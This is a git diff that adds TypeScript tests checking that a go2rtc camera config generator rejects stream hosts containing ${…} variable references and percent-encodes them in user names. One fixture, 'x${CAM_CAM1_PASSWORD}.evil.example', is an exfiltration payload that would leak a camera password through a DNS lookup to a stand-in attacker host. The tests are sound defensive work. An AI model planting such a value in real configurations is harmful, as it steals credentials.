@@ -107,3 +107,25 @@ describe('go2rtc output: no password in a log line', () => {
     }
   }, 15_000);
 });
+
+// Review of #173: go2rtc expands ${VAR} anywhere in its config, and one go2rtc
+// holds every camera's password variable: a host like the one below would
+// send cam1's password out in a DNS lookup.
+describe('go2rtc config: nothing it would expand', () => {
+  const EXPLOIT = 'x${CAM_CAM1_PASSWORD}.evil.example';
+  it('refuses a host with ${…} (the exploit) or anything but a name/address and port', () => {
+    expect(() => go2rtcConfig({ rtspPort: 1, apiPort: 2 }, [{ ...src('cam3'), host: EXPLOIT }])).toThrow(/cam3: unsafe stream source host/);
+    for (const host of ['a$b', 'a{b}', 'a@b', 'a/b', 'a b', '']) expect(() => go2rtcConfig({ rtspPort: 1, apiPort: 2 }, [{ ...src('cam3'), host }])).toThrow(/unsafe stream source host/);
+    expect(() => go2rtcConfig({ rtspPort: 1, apiPort: 2 }, [{ ...src('cam3'), port: 1.5 }])).toThrow(/unsafe stream source port/);
+    expect(() => go2rtcConfig({ rtspPort: 1, apiPort: 2 }, [{ ...src('cam3'), cam: 'Cam${X}' }])).toThrow(/unsafe stream source camera id/);
+  });
+  it('a user with $ or { is percent-encoded: never ${ in the config', () => {
+    const text = go2rtcConfig({ rtspPort: 1, apiPort: 2 }, [{ ...src('cam3'), user: 'u${CAM_CAM1_PASSWORD}' }]);
+    const cfg = JSON.parse(text) as { streams: Record<string, string> };
+    expect(cfg.streams.cam3_sub).toBe('rtsp://u%24%7BCAM_CAM1_PASSWORD%7D:${CAM_CAM3_PASSWORD}@127.0.0.1:9/h264Preview_01_sub');
+  });
+  it('setStream refuses the exploit host before any API call', async () => {
+    const g = new Go2rtc({ binary: '/nonexistent/go2rtc', rtspPort: 1, apiPort: 2, sources: () => [] });
+    await expect(g.setStream({ ...src('cam6'), host: EXPLOIT })).rejects.toThrow(/unsafe stream source host/);
+  });
+});
